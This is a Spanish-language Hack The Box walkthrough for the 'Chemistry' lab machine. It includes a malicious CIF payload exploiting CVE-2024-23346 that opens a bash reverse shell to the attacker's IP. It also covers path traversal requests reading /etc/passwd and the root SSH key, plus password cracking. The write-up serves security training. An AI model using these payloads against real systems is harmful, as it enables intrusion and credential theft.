---
title: chemistry
parent: Easy
nav_order: 1
---


# Walkthrough — Chemistry (Hack The Box)
{: .fs-9 }

> Walkthrough para la máquina *Chemistry* de HTB, enfocado en la explotación de archivos `.cif` y ejecución remota de comandos.
{: .fs-6 .fw-300 }

---

## Introducción

**Chemistry** es una máquina de nivel *Easy* en Hack The Box. El enfoque principal está en analizar un servicio web que permite subir archivos de cristalografía (`.cif`) y que resulta vulnerable a **command injection**.

- SO: Linux  
- Dificultad: Easy  

## Herramientas utilizadas
- `nmap` → escaneo de puertos y servicios
- `nc` (netcat) → recepción de reverse shell
- `sqlite3` → análisis de base de datos
- `hashes.com` → crackeo de hashes
- `ssh` → acceso remoto al sistema
- `whatweb` → fingerprinting de la aplicación web
- `gobuster` → enumeración de directorios
- `curl` → explotación de LFI y extracción de archivos


![Intro](/assets/images/chemistry/00-pwned.png)

---

## Enumeración inicial

Lo primero que hice fue lanzar un escaneo completo de todos los puertos con `nmap`, usando la opción `-Pn` para no depender de ICMP:

```bash
nmap -p- -Pn 10.10.11.38
```

Una vez identificados los puertos accesibles, ejecuté un escaneo más focalizado con scripts y detección de versiones:

```bash
nmap -p 22,5000 -sC -sV -Pn 10.10.11.38
```

Resultado del análisis:

- **22/tcp** → filtrado (SSH)  
- **5000/tcp** → filtrado (aunque realmente resultó ser un servicio web Flask)

![Escaneo focalizado](/assets/images/chemistry/01-nmap-focalizado.png)

---

## Enumeración del servicio web

Al acceder al puerto **5000** descubrí una aplicación llamada **Chemistry CIF Analyzer**. La pantalla principal me ofrecía las opciones de *Login* y *Register*.

![Login](/assets/images/chemistry/02-web-login.png)

Me registré con un nuevo usuario:

![Register](/assets/images/chemistry/03-register.png)

Tras loguearme, accedí a un *dashboard* que permitía subir archivos `.cif` para su análisis.

![Dashboard](/assets/images/chemistry/04-dashboard.png)

Investigando cómo se procesaban los archivos `.cif`, descubrí que la aplicación era vulnerable a **CVE-2024-23346**.  
Este fallo de seguridad afecta al parser de CIF, permitiendo la ejecución arbitraria de comandos cuando se manipulan ciertos campos del archivo.

![Ejemplo de CIF](/assets/images/chemistry/05-cif-example.png)

---

## Foothold

Siguiendo la pista de la vulnerabilidad **CVE-2024-23346**, preparé un archivo `example.cif` malicioso.  
En él modifiqué el campo `_space_group_magn.transform_BNS_Pp_abc` para que ejecutara una **reverse shell** contra mi máquina atacante en el puerto **4443**.

```cif
_space_group_magn.transform_BNS_Pp_abc 
'a,b,[d for d in ().__class__.__mro__[1].__subclasses__() 
if d.__name__ == "BuiltinImporter"][0].load_module("os").system("/bin/bash -c 'sh -i >& /dev/tcp/10.10.14.7/4443 0>&1'")'
```

![Payload en CIF](/assets/images/chemistry/06-cif-payload.png)

Antes de subirlo, levanté un listener con **netcat** para recibir la conexión:

```bash
nc -lvnp 4443
```

![Listener](/assets/images/chemistry/07-listener.png)

Finalmente, subí el archivo `example.cif` al panel web:

![Upload del CIF malicioso](/assets/images/chemistry/08-upload.png)



Tras subir el archivo `.cif` malicioso y explotarlo, recibí una **reverse shell** en mi máquina. Ya tenía acceso inicial a la víctima, aunque con permisos limitados.

![Foothold](/assets/images/chemistry/10-foothold.png)

Dentro del sistema encontré un directorio `instance` que contenía una base de datos SQLite (`database.db`).

---

## Enumeración de credenciales

Abrí la base de datos con `sqlite3` y revisé la tabla `user`. Allí se almacenaban diferentes usuarios junto con hashes de contraseñas.

![Database dump](/assets/images/chemistry/11-database.png)

De todos los usuarios listados, observé que **rosa** era el único que tenía `/bin/bash` como su shell por defecto. Esto lo convertía en un candidato ideal para intentar un acceso.

---

## Cracking de hash

Extraje el hash correspondiente a `rosa` y lo envié a la plataforma **hashes.com** para comprobar si ya estaba crackeado previamente.

![Hash cracked](/assets/images/chemistry/12-cracked.png)

El hash se resolvió exitosamente, revelando la contraseña en texto plano:  

```
unicorniorosados
```

---

## Acceso SSH

Con estas credenciales, probé iniciar sesión vía SSH como el usuario `rosa`. El acceso fue exitoso y confirmé que estaba dentro de la máquina con su cuenta.

![SSH rosa](/assets/images/chemistry/13-ssh-rosa.png)

---

## 🏁 Flag de usuario

En el directorio personal de `rosa` encontré el archivo `user.txt`.

![User flag](/assets/images/chemistry/14-user-flag.png)

**Flag de usuario conseguida con éxito.**

---

# Escalada a Root
Tras conseguir la shell como usuario **rosa**, el siguiente paso fue escalar privilegios y explorar servicios internos.

---

## Identificación de servicios internos

Con `netstat` pude identificar que había un servicio expuesto en **localhost:8080**, además del puerto 5000 y SSH:

![Netstat](/assets/images/chemistry/15-netstat.png)

Mediante un **port forwarding** usando SSH, logré acceder desde mi máquina atacante al puerto 8080 redirigido al 4000 local:

```bash
ssh -L 4000:localhost:8080 rosa@10.10.11.38
```

![SSH Tunnel](/assets/images/chemistry/16-ssh-tunnel.png)

Al abrir el navegador en `http://localhost:4000`, me encontré con un panel web de monitoreo interno:

![Panel interno](/assets/images/chemistry/17-internal-panel.png)

---

## Fingerprinting del servicio

Con la herramienta `whatweb` confirmé que la aplicación corría sobre **Python 3.9 + aiohttp 3.9.1**:

![Whatweb](/assets/images/chemistry/18-whatweb.png)

Esto inmediatamente levantó sospechas, ya que la versión **aiohttp 3.9.1** está afectada por la vulnerabilidad **GHSA-5h86-8mv2-jq9f**, que permite **Path Traversal** en ciertas configuraciones.

📌 Referencia: [GitHub Advisory GHSA-5h86-8mv2-jq9f](https://github.com/advisories/GHSA-5h86-8mv2-jq9f)

---

## Enumeración con Gobuster

Con `gobuster` encontré el directorio `/assets`:

![Gobuster](/assets/images/chemistry/19-gobuster.png)

---

## Explotación de Path Traversal

Dado que `/assets` servía archivos estáticos, probé distintas variantes de **Path Traversal**:

```
/assets/../etc/passwd
/assets/../../etc/passwd
/assets/../../../etc/passwd
/assets/../../../../etc/passwd
```

🎯 ¡Bingo! Logré acceder al archivo `/etc/passwd`:

![LFI passwd](/assets/images/chemistry/20-passwd.png)

Esto confirmó que la aplicación era vulnerable a **Local File Inclusion (LFI) mediante Path Traversal**.

---

## Accediendo a claves sensibles

Tras validar la vulnerabilidad, avancé hacia la búsqueda de archivos críticos como claves privadas. Finalmente logré extraer la **clave privada SSH del root**:

![Root Key Found](/assets/images/chemistry/21-root-key.png)

---

## Acceso como root

Con la clave descargada y los permisos correctos (`chmod 600`), me conecté como **root** en la máquina:

```bash
ssh -i root.key root@10.10.11.38
```

![Root Shell](/assets/images/chemistry/root/22-root-shell.png)

Una vez dentro, confirmé la escalada y leí la flag de **root.txt** :


🎉 **¡Máquina completada con éxito!**

---

**Autor:** [gueco99](https://github.com/gueco99)  
🧠 Hack the Box – *Chemistry* (Easy)
